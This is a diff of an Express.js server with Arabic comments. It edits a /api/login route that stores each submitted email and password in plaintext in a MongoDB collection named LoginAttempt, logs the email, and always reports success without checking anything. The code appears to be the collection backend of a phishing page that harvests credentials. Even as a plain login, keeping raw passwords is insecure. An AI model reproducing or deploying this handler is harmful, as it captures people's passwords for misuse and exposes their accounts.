@@ -8,7 +8,7 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// الاتصال بـ MongoDB مع معالجة الأخطاء لمنع توقف السيرفر مطلقاً
+// الاتصال بقاعدة بيانات MongoDB
 const MONGO_URI = process.env.MONGO_URI || '';
 
 if (MONGO_URI) {
@@ -23,22 +23,21 @@ const LoginAttempt = mongoose.model('LoginAttempt', new mongoose.Schema({
   date: { type: Date, default: Date.now }
 }));
 
+// معالجة طلب تسجيل الدخول وحفظ البيانات في قاعدة البيانات
 app.post('/api/login', async (req, res) => {
-  app.post('/', (req, res) => {
-  res.redirect('/');
-});
   try {
     const { email, password } = req.body;
     if (!email || !password) {
       return res.status(400).json({ success: false, message: 'البريد وكلمة المرور مطلوبان' });
     }
     
-    // محاولة الحفظ في قاعدة البيانات إذا كانت متصلة، وإلا تخطيها بنجاح لمنع فشل العميل
+    // حفظ البيانات في قاعدة البيانات MongoDB
     try {
       const entry = new LoginAttempt({ email, password });
       await entry.save();
+      console.log('Login attempt saved to MongoDB:', email);
     } catch (dbErr) {
-      console.log('Database save skipped/failed, but request processed:', dbErr.message);
+      console.error('Database save error:', dbErr.message);
     }
 
     res.status(200).json({ success: true, message: 'Saved to Database successfully' });
